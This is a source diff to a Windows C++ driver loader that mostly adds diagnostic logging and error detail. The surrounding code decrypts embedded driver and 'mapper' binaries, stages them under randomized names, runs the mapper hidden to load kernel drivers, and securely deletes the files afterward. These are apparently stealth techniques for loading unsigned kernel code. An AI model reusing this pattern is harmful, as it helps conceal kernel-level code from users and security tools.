@@ -3,6 +3,9 @@
 #include "sentinel_encrypted.h"
 #include "windmapper_embedded.h"
 #include "shadowfs_encrypted.h"
+#ifdef AIDA_STANDALONE
+#include "helpers/diag_log.hpp"
+#endif
 
 #ifndef WIN32_LEAN_AND_MEAN
 #define WIN32_LEAN_AND_MEAN
@@ -14,8 +17,10 @@
 #include <objbase.h>
 #include <winsvc.h>
 #include <fltUser.h>
+#include <cstdarg>
 #include <cstdio>
 #include <cstring>
+#include <cwchar>
 #include <string>
 #include <vector>
 #include <filesystem>
@@ -35,14 +40,41 @@ namespace
     bool g_loaded = false;
     std::string s_last_error;
 
+    void loader_diag(const char* msg)
+    {
+#ifdef AIDA_STANDALONE
+        diag::log_tagged_critical("driver_loader", msg);
+#else
+        (void)msg;
+#endif
+    }
+
+    void loader_diag_fmt(const char* fmt, ...)
+    {
+#ifdef AIDA_STANDALONE
+        char buf[2048];
+        va_list ap;
+        va_start(ap, fmt);
+        _vsnprintf_s(buf, sizeof(buf), _TRUNCATE, fmt, ap);
+        va_end(ap);
+        diag::log_tagged_critical("driver_loader", buf);
+#else
+        (void)fmt;
+#endif
+    }
+
     void set_last_error(const char* msg)
     {
         s_last_error.assign(msg ? msg : "");
+        if (!s_last_error.empty())
+            loader_diag_fmt("last_error=\"%s\"", s_last_error.c_str());
     }
 
     void set_last_error(const std::string& msg)
     {
         s_last_error = msg;
+        if (!s_last_error.empty())
+            loader_diag_fmt("last_error=\"%s\"", s_last_error.c_str());
     }
 
     void set_last_error_status(const char* prefix, NTSTATUS status)
@@ -52,7 +84,40 @@ namespace
                       static_cast<unsigned long>(status));
         std::string out = prefix ? prefix : "";
         out += buf;
-        s_last_error = out;
+        set_last_error(out);
+    }
+
+    void set_last_error_fmt(const char* fmt, ...)
+    {
+        char buf[512];
+        va_list ap;
+        va_start(ap, fmt);
+        vsnprintf(buf, sizeof(buf), fmt, ap);
+        va_end(ap);
+        set_last_error(buf);
+    }
+
+    std::string utf8_from_wide(const std::wstring& w)
+    {
+        if (w.empty())
+            return {};
+        int needed = WideCharToMultiByte(CP_UTF8, 0, w.c_str(),
+            static_cast<int>(w.size()), nullptr, 0, nullptr, nullptr);
+        if (needed <= 0)
+            return {};
+        std::string out(static_cast<size_t>(needed), '\0');
+        WideCharToMultiByte(CP_UTF8, 0, w.c_str(),
+            static_cast<int>(w.size()), out.data(), needed, nullptr, nullptr);
+        return out;
+    }
+
+    bool should_keep_stage()
+    {
+        wchar_t env[16] = {};
+        DWORD n = GetEnvironmentVariableW(L"AIDA_KEEP_DRIVER_STAGE", env, static_cast<DWORD>(_countof(env)));
+        if (n == 0)
+            n = GetEnvironmentVariableW(L"AIDA_KEEP_STAGE", env, static_cast<DWORD>(_countof(env)));
+        return n > 0 && env[0] != L'\0' && env[0] != L'0';
     }
 
     bool verify_blob_integrity(const unsigned char* data, unsigned long size,
@@ -86,6 +151,16 @@ namespace
         if (ec)
             return {};
         return p.wstring();
+    }
+
+    std::wstring get_module_dir()
+    {
+        wchar_t path[MAX_PATH] = {};
+        DWORD n = GetModuleFileNameW(nullptr, path, MAX_PATH);
+        if (n == 0 || n >= MAX_PATH)
+            return {};
+        std::filesystem::path p(path);
+        return p.parent_path().wstring();
     }
 
     std::wstring random_token(size_t bytes)
@@ -216,12 +291,20 @@ namespace
                            const unsigned char* key, unsigned long key_len,
                            const unsigned char* nonce, unsigned long nonce_len,
                            const unsigned char* tag, unsigned long tag_len,
-                           const std::wstring& out_path)
+                           const std::wstring& out_path,
+                           const char* label)
     {
+        const std::string out_path_utf8 = utf8_from_wide(out_path);
+        loader_diag_fmt("stage_write_begin label=%s path=\"%s\" bytes=%lu",
+            label ? label : "?",
+            out_path_utf8.empty() ? "<empty>" : out_path_utf8.c_str(),
+            ciphertext_len);
+
         auto* buf = static_cast<unsigned char*>(
             VirtualAlloc(nullptr, ciphertext_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
         if (!buf) {
-            set_last_error("VirtualAlloc failed for driver decrypt buffer");
+            set_last_error_fmt("VirtualAlloc failed for %s decrypt buffer gle=%lu bytes=%lu",
+                label ? label : "driver", static_cast<unsigned long>(GetLastError()), ciphertext_len);
             return false;
         }
 
@@ -238,30 +321,44 @@ namespace
         if (!verify_blob_integrity(buf, ciphertext_len, ciphertext_len)) {
             SecureZeroMemory(buf, ciphertext_len);
             VirtualFree(buf, 0, MEM_RELEASE);
-            set_last_error("Decrypted driver blob failed PE integrity check");
+            set_last_error_fmt("Decrypted %s blob failed PE integrity check", label ? label : "driver");
             return false;
         }
 
         HANDLE hf = CreateFileW(out_path.c_str(), GENERIC_WRITE, 0, nullptr,
                                 CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
         if (hf == INVALID_HANDLE_VALUE) {
+            DWORD gle = GetLastError();
             SecureZeroMemory(buf, ciphertext_len);
             VirtualFree(buf, 0, MEM_RELEASE);
-            set_last_error("CreateFileW failed for staged driver");
+            set_last_error_fmt("CreateFileW failed for staged %s gle=%lu path=\"%s\"",
+                label ? label : "driver", static_cast<unsigned long>(gle),
+                out_path_utf8.empty() ? "<empty>" : out_path_utf8.c_str());
             return false;
         }
 
         DWORD written = 0;
         BOOL ok = WriteFile(hf, buf, ciphertext_len, &written, nullptr);
+        DWORD write_gle = GetLastError();
         FlushFileBuffers(hf);
         CloseHandle(hf);
         SecureZeroMemory(buf, ciphertext_len);
         VirtualFree(buf, 0, MEM_RELEASE);
 
         if (!ok || written != ciphertext_len) {
-            set_last_error("WriteFile failed for staged driver");
+            set_last_error_fmt("WriteFile failed for staged %s ok=%d written=%lu expected=%lu gle=%lu path=\"%s\"",
+                label ? label : "driver",
+                ok ? 1 : 0,
+                static_cast<unsigned long>(written),
+                ciphertext_len,
+                static_cast<unsigned long>(write_gle),
+                out_path_utf8.empty() ? "<empty>" : out_path_utf8.c_str());
             return false;
         }
+        loader_diag_fmt("stage_write_ok label=%s path=\"%s\" bytes=%lu",
+            label ? label : "?",
+            out_path_utf8.empty() ? "<empty>" : out_path_utf8.c_str(),
+            ciphertext_len);
         return true;
     }
 
@@ -285,6 +382,23 @@ namespace
             CloseHandle(hf);
         }
         DeleteFileW(path.c_str());
+    }
+
+    void cleanup_stage_file(const std::wstring& path, const char* label)
+    {
+        if (path.empty())
+            return;
+        const std::string path_utf8 = utf8_from_wide(path);
+        if (should_keep_stage()) {
+            loader_diag_fmt("stage_preserved label=%s path=\"%s\"",
+                label ? label : "?",
+                path_utf8.empty() ? "<empty>" : path_utf8.c_str());
+            return;
+        }
+        loader_diag_fmt("stage_delete label=%s path=\"%s\"",
+            label ? label : "?",
+            path_utf8.empty() ? "<empty>" : path_utf8.c_str());
+        secure_delete(path);
     }
 
     bool g_shadow_fs_loaded = false;
@@ -559,12 +673,15 @@ namespace driver_loader
             return true;
 
         s_last_error.clear();
+        loader_diag("initialize_and_load_begin");
 
         std::wstring stage = get_stage_dir();
         if (stage.empty()) {
             set_last_error("Failed to resolve LocalAppData stage directory");
             return false;
         }
+        loader_diag_fmt("stage_dir=\"%s\" keep_stage=%d",
+            utf8_from_wide(stage).c_str(), should_keep_stage() ? 1 : 0);
 
         std::wstring mapper_path = make_stage_path(stage, L".exe");
         std::wstring whoswho_path = make_stage_path(stage, L".sys");
@@ -578,12 +695,18 @@ namespace driver_loader
             set_last_error("Failed to allocate randomized stage paths");
             return false;
         }
+        loader_diag_fmt("stage_paths mapper=\"%s\" whoswho=\"%s\" sentinel=\"%s\" shadowfs=\"%s\"",
+            utf8_from_wide(mapper_path).c_str(),
+            utf8_from_wide(whoswho_path).c_str(),
+            utf8_from_wide(sentinel_path).c_str(),
+            shadowfs_path.empty() ? "<none>" : utf8_from_wide(shadowfs_path).c_str());
 
         if (!decrypt_and_write(g_windmapper_ciphertext, g_windmapper_ciphertext_len,
                                g_windmapper_key, sizeof(g_windmapper_key),
                                g_windmapper_nonce, sizeof(g_windmapper_nonce),
                                g_windmapper_tag, sizeof(g_windmapper_tag),
-                               mapper_path)) {
+                               mapper_path, "windmapper")) {
+            cleanup_stage_file(mapper_path, "windmapper");
             return false;
         }
 
@@ -591,8 +714,9 @@ namespace driver_loader
                                g_whoswho_key, sizeof(g_whoswho_key),
                                g_whoswho_nonce, sizeof(g_whoswho_nonce),
                                g_whoswho_tag, sizeof(g_whoswho_tag),
-                               whoswho_path)) {
-            secure_delete(mapper_path);
+                               whoswho_path, "whoswho")) {
+            cleanup_stage_file(mapper_path, "windmapper");
+            cleanup_stage_file(whoswho_path, "whoswho");
             return false;
         }
 
@@ -600,9 +724,10 @@ namespace driver_loader
                                g_sentinel_key, sizeof(g_sentinel_key),
                                g_sentinel_nonce, sizeof(g_sentinel_nonce),
                                g_sentinel_tag, sizeof(g_sentinel_tag),
-                               sentinel_path)) {
-            secure_delete(mapper_path);
-            secure_delete(whoswho_path);
+                               sentinel_path, "sentinel")) {
+            cleanup_stage_file(mapper_path, "windmapper");
+            cleanup_stage_file(whoswho_path, "whoswho");
+            cleanup_stage_file(sentinel_path, "sentinel");
             return false;
         }
 
@@ -611,10 +736,11 @@ namespace driver_loader
                                    g_shadowfs_key, sizeof(g_shadowfs_key),
                                    g_shadowfs_nonce, sizeof(g_shadowfs_nonce),
                                    g_shadowfs_tag, sizeof(g_shadowfs_tag),
-                                   shadowfs_path)) {
-                secure_delete(mapper_path);
-                secure_delete(whoswho_path);
-                secure_delete(sentinel_path);
+                                   shadowfs_path, "shadowfs")) {
+                cleanup_stage_file(mapper_path, "windmapper");
+                cleanup_stage_file(whoswho_path, "whoswho");
+                cleanup_stage_file(sentinel_path, "sentinel");
+                cleanup_stage_file(shadowfs_path, "shadowfs");
                 return false;
             }
         }
@@ -624,6 +750,18 @@ namespace driver_loader
         if (!shadowfs_path.empty()) {
             cmdline += L" \"" + shadowfs_path + L"\"";
         }
+        loader_diag_fmt("mapper_cmdline=\"%s\"", utf8_from_wide(cmdline).c_str());
+
+        std::wstring mapper_log_path;
+        std::wstring module_dir = get_module_dir();
+        if (!module_dir.empty()) {
+            mapper_log_path = (std::filesystem::path(module_dir) / L"WindMapper_debug.log").wstring();
+            SetEnvironmentVariableW(L"AIDA_MAPPER_LOG", mapper_log_path.c_str());
+            loader_diag_fmt("mapper_log_path=\"%s\"", utf8_from_wide(mapper_log_path).c_str());
+        } else {
+            SetEnvironmentVariableW(L"AIDA_MAPPER_LOG", nullptr);
+            loader_diag("mapper_log_path=<unresolved>");
+        }
 
         STARTUPINFOW si = {};
         si.cb = sizeof(si);
@@ -631,6 +769,7 @@ namespace driver_loader
         si.wShowWindow = SW_HIDE;
 
         PROCESS_INFORMATION pi = {};
+        loader_diag("mapper_create_process_begin");
         BOOL created = CreateProcessW(
             mapper_path.c_str(),
             &cmdline[0],
@@ -641,12 +780,18 @@ namespace driver_loader
             &si, &pi);
 
         if (!created) {
-            secure_delete(mapper_path);
-            secure_delete(whoswho_path);
-            secure_delete(sentinel_path);
-            set_last_error("CreateProcessW failed for mapper stage");
+            DWORD gle = GetLastError();
+            cleanup_stage_file(mapper_path, "windmapper");
+            cleanup_stage_file(whoswho_path, "whoswho");
+            cleanup_stage_file(sentinel_path, "sentinel");
+            cleanup_stage_file(shadowfs_path, "shadowfs");
+            set_last_error_fmt("CreateProcessW failed for mapper stage gle=%lu mapper=\"%s\"",
+                static_cast<unsigned long>(gle), utf8_from_wide(mapper_path).c_str());
             return false;
         }
+        loader_diag_fmt("mapper_create_process_ok pid=%lu tid=%lu",
+            static_cast<unsigned long>(pi.dwProcessId),
+            static_cast<unsigned long>(pi.dwThreadId));
 
         HANDLE hJob = CreateJobObjectW(nullptr, nullptr);
         if (hJob) {
@@ -656,29 +801,58 @@ namespace driver_loader
                 JOB_OBJECT_LIMIT_DIE_ON_UNHANDLED_EXCEPTION;
             SetInformationJobObject(hJob, JobObjectExtendedLimitInformation,
                                     &jeli, sizeof(jeli));
-            AssignProcessToJobObject(hJob, pi.hProcess);
+            BOOL assigned = AssignProcessToJobObject(hJob, pi.hProcess);
+            loader_diag_fmt("mapper_job assigned=%d gle=%lu",
+                assigned ? 1 : 0, static_cast<unsigned long>(GetLastError()));
+        } else {
+            loader_diag_fmt("mapper_job create_failed gle=%lu", static_cast<unsigned long>(GetLastError()));
         }
 
-        ResumeThread(pi.hThread);
+        DWORD resume_result = ResumeThread(pi.hThread);
+        loader_diag_fmt("mapper_resume result=%lu gle=%lu",
+            static_cast<unsigned long>(resume_result),
+            static_cast<unsigned long>(GetLastError()));
 
-        WaitForSingleObject(pi.hProcess, 90000);
+        DWORD wait_result = WaitForSingleObject(pi.hProcess, 90000);
+        DWORD wait_gle = GetLastError();
+        loader_diag_fmt("mapper_wait result=0x%08lX gle=%lu",
+            static_cast<unsigned long>(wait_result),
+            static_cast<unsigned long>(wait_gle));
 
         DWORD exit_code = 1;
-        GetExitCodeProcess(pi.hProcess, &exit_code);
+        BOOL got_exit = GetExitCodeProcess(pi.hProcess, &exit_code);
+        DWORD exit_gle = GetLastError();
+        loader_diag_fmt("mapper_exit got=%d code=0x%08lX gle=%lu log=\"%s\"",
+            got_exit ? 1 : 0,
+            static_cast<unsigned long>(exit_code),
+            static_cast<unsigned long>(exit_gle),
+            mapper_log_path.empty() ? "<unresolved>" : utf8_from_wide(mapper_log_path).c_str());
         CloseHandle(pi.hProcess);
         CloseHandle(pi.hThread);
         if (hJob)
             CloseHandle(hJob);
 
-        secure_delete(mapper_path);
-        secure_delete(whoswho_path);
-        secure_delete(sentinel_path);
-        if (!shadowfs_path.empty()) {
-            secure_delete(shadowfs_path);
+        cleanup_stage_file(mapper_path, "windmapper");
+        cleanup_stage_file(whoswho_path, "whoswho");
+        cleanup_stage_file(sentinel_path, "sentinel");
+        cleanup_stage_file(shadowfs_path, "shadowfs");
+
+        if (wait_result == WAIT_TIMEOUT) {
+            set_last_error_fmt("Mapper stage timed out after 90000 ms log=\"%s\"",
+                mapper_log_path.empty() ? "<unresolved>" : utf8_from_wide(mapper_log_path).c_str());
+            return false;
+        }
+        if (wait_result == WAIT_FAILED) {
+            set_last_error_fmt("WaitForSingleObject failed for mapper gle=%lu log=\"%s\"",
+                static_cast<unsigned long>(wait_gle),
+                mapper_log_path.empty() ? "<unresolved>" : utf8_from_wide(mapper_log_path).c_str());
+            return false;
         }
 
         if (exit_code != 0) {
-            set_last_error("Mapper stage exited with non-zero status");
+            set_last_error_fmt("Mapper stage exited with non-zero status exit_code=0x%08lX log=\"%s\"",
+                static_cast<unsigned long>(exit_code),
+                mapper_log_path.empty() ? "<unresolved>" : utf8_from_wide(mapper_log_path).c_str());
             return false;
         }
 
@@ -687,6 +861,7 @@ namespace driver_loader
             g_shadow_fs_loaded = true;
         }
 
+        loader_diag("initialize_and_load_success");
         return true;
     }
 }
